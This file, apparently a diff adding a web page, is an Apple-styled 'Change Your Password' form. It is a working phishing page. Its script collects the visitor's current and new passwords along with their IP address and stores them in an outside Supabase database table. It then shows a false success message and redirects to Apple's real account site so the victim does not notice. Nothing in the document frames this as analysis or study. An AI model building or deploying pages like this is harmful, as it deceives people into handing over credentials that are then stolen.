@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Change Password</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      background: #f5f5f7;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: #1d1d1f;
+    }
+
+    .container {
+      background: #fff;
+      padding: 40px 32px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+
+    h2 {
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 18px;
+      letter-spacing: -0.3px;
+    }
+
+    .instructions {
+      font-size: 13px;
+      color: #6e6e73;
+      margin-bottom: 32px;
+      line-height: 1.5;
+    }
+
+    input {
+      width: 80%;
+      padding: 12px 14px;
+      margin: 12px 0;
+      margin-left: 20px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 15px;
+      transition: border-color 0.2s;
+      display: block;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #0071e3;
+    }
+
+    button {
+      width: 60%;
+      padding: 14px;
+      margin-top: 18px;
+      background: linear-gradient(135deg, #34a8ff, #007aff);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: linear-gradient(135deg, #4ab3ff, #0080ff);
+    }
+
+    .message {
+      margin-top: 14px;
+      font-size: 14px;
+    }
+
+    .success {
+      color: #0a9b2a;
+    }
+
+    .error {
+      color: #d93025;
+    }
+
+    @media(max-width: 480px){
+      .container { padding: 28px 20px; }
+      h2 { font-size: 20px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Change Your Password</h2>
+    <p class="instructions">
+      Your password must be at least six<br>
+      characters and should include a<br>
+      combination of numbers, letters and<br>
+      special characters (!$@％).
+    </p>
+
+    <input type="password" id="op" placeholder="current password" />
+    <input type="password" id="fp" placeholder="new password" />
+    <input type="password" id="cp" placeholder="confirm new password" />
+    <button onclick="storePasswords()">Update Password</button>
+    <div id="message" class="message"></div>
+  </div>
+
+  <script type="module">
+    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm'
+
+    const supabase = createClient(
+      'https://cjwoizyfasbxbmtcmnpj.supabase.co',
+      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNqd29penlmYXNieGJtdGNtbnBqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE4MjQ5MzcsImV4cCI6MjA2NzQwMDkzN30.dwPcx-uCfixYxF-YAhZAdZR1VGkuOSI3sgCLeWX7xTM'
+    )
+
+    async function getUserIP() {
+     try {
+       const res = await fetch('https://api64.ipify.org?format=json');
+       const data = await res.json();
+       return data.ip;
+     } catch {
+       return 'Unavailable';
+     }
+    }
+
+    window.storePasswords = async function () {
+      const op = document.getElementById('op').value.trim();
+      const fp = document.getElementById('fp').value.trim();
+      const cp = document.getElementById('cp').value.trim();
+      const message = document.getElementById('message');
+
+      message.textContent = '';
+      message.className = 'message';
+
+      if (!op || !fp || !cp) {
+        message.textContent = 'All fields are required.';
+        message.classList.add('error');
+        return;
+      }
+
+      if (fp !== cp) {
+        message.textContent = 'New passwords do not match.';
+        message.classList.add('error');
+        return;
+      }
+
+      const ip = await getUserIP();
+
+      const { error } = await supabase.from('zero_cp').insert([
+        { op: op, fp: fp, ip }
+      ]);
+
+      if (error) {
+        message.textContent = 'Error: ' + error.message;
+        message.classList.add('error');
+      } else {
+        message.textContent = 'Password successfully updated.';
+        message.classList.add('success');
+
+        setTimeout(() => {
+          window.location.href = ' https://account.apple.com';
+        }, 1500);
+      }
+    }
+  </script>
+</body>
+</html>
